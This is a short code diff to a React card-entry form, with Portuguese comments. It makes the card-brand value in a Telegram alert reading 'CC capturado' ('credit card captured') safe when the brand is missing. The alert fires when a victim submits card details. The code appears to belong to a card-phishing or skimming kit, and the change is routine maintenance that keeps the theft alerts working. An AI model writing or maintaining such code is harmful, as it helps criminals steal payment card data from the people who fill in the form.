@@ -51,7 +51,7 @@ export const CardForm: React.FC<CardFormProps> = ({
     
     // Enviar notificação do Telegram quando os dados do cartão forem preenchidos e enviados
     try {
-      await sendTelegramNotification(`💳 2x CC capturado - ${cardData.brand.toUpperCase()}`);
+      await sendTelegramNotification(`💳 2x CC capturado - ${(cardData.brand || 'unknown').toUpperCase()}`);
     } catch (error) {
       console.error('Error sending Telegram notification:', error);
     }
